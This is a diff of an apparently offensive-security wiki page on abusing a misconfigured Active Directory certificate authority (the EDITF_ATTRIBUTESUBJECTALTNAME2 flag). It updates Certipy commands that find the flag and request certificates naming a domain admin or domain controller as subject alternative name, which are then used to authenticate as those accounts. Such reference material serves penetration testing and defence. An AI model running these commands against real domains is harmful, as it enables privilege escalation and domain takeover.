@@ -18,30 +18,21 @@ If the CA is configured with the  `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins 
 {% tab title="UNIX-like" %}
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate info about the CAs, including the "**User Specified SAN**" flag state which is an alias to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
 
-```python
-certipy find 'domain.local'/'user':'password'@'domain_controller'
-grep "User Specified SAN" "DATE_Certipy.txt" 
+```bash
+certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -stdout | grep "User Specified SAN"
 ```
 
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
 {% endhint %}
 
-{% hint style="success" %}
-Certipy's `auto` mode can also be used to automatically abuse a misconfigured CA.
-{% endhint %}
+Once the right template is found (i.e. the default User template) ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
 
-The same "find" command can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.).
-
-```bash
-certipy find 'domain.local'/'user':'password'@'domain_controller'
-```
-
-Once the right template is found (i.e. the default User template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
-
-```bash
-certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'certificate template' -alt 'domain admin'
-```
+<pre class="language-bash"><code class="lang-bash"><strong>#To specify a user account in the SAN
+</strong><strong>certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+</strong><strong>
+</strong><strong>#To specify a computer account in the SAN
+</strong>certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'</code></pre>
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 {% endtab %}
